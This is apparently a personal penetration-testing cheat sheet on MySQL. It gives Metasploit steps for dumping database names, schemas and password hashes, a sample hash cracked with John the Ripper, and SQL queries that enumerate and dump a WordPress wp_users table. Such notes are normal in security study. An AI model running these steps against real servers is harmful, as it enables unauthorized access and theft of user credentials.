# MySQL	
***RDBMS*** : Relational DataBase Management System  
***SGBD*** :  Système de Gestion de Base de Données  

##### Connect to MYSQL remote server
```bash
mysql -u [username] -p -h [host ip]
```
**View a .sql file (from mysql service) /!\   
It requires to be in the same directory as the .sql file**
```bash
source file.sql
```

## SQL CHEATSHEET :
```mysql
SHOW DATABASES;
USE db_name;
SHOW TABLES;
DESCRIBE table_name;
```


## MetaSploit Example
For this example, credentials should be correct.  
### Credential testing
```bash
mysql -h [IP] -u [username] -p
```

### Vulnerability exploitation :
(In this example, the MySQL version is vulnerable)  

```bash
msfconsole
```
***Start exploitation***
```bash
search mysql_sql
use 0
set password/rhosts/username
run
result -> 5.7.29-0ubuntu0.18.04.1
```
It returns DB names


```bash
search mysql_schemadump
use 0
set options
...
run
```

It returns all tables, their columns name and type

```bash
search mysql_hashdump
use 1
set options
run
```
It returns all usernames and passwords hashes

### Crash hashes
If you don't know what to do, please check [John-The-Ripper.md](./John-The-Ripper.md) and [hashcat.md](./hashcat.md)

Hash example : ```carl:*EA031893AA21444B170FC2162A56978B8CEECE18```
```bash
john hash.txt
```

***Les mots de passe sont très souvent réutilisés***


## Injection and Dump:
Using MySQL Service

***Show all db names***
```sql
SELECT DISTINCT table_schema FROM INFORMATION_SCHEMA.tables;
```


| table_schema       |
| :----------------- |
| information_schema |
| sys                |
| wp1b_itconnect     |
| performance_schema |
| mysql              |

In this exemple, only wp1b_itconnect is a user-made DB.  
Others are defaults  
*** Show all tables from a database***  
```sql
SELECT DISTINCT TABLE_NAME FROM INFORMATION_SCHEMA.tables WHERE table_Schema LIKE 'wp%';
```

| TABLE_NAME               |
| :----------------------- |
| wp_term_taxonomy         |
| wp_usermeta              |
| wp_terms                 |
| web14_terms              |
| web14_termmeta           |
| wp_term_relationships    |
| web14_posts              |
| web14_links              |
| web14_postmeta           |
| web14_usermeta           |
| wp_postmeta              |
| wp_comments              |
| web14_users              |
| wp_termmeta              |
| wp_options               |
| web14_term_relationships |
| wp_users                 |
| wp_posts                 |
| wp_links                 |
| web14_comments           |
| web14_term_taxonomy      |
| web14_options            |
| web14_commentmeta        |
| wp_commentmeta           |

This output come from a WordPress DB.    
By default, user informations are stored in wp_users  

**Show all columns names from a table***
```sql
SELECT DISTINCT COLUMN_NAME FROM INFORMATION_SCHEMA.columns WHERE table_Schema LIKE 'wp%' AND TABLE_NAME LIKE 'wp_users';
```

| COLUMN_NAME         |
|:------------------- |
| ID                  |
| user_login          |
| user_pass           |
| user_nicename       |
| user_email          |
| user_url            |
| user_registered     |
| user_activation_key |
| user_status         |
| display_name        |

This is a default WordPress DB example.


***DUMP Database***  
Change current DB
```sql
USE wp1b_itconnect;
```
DUMP data
```sql
SELECT * FROM wp_users;
```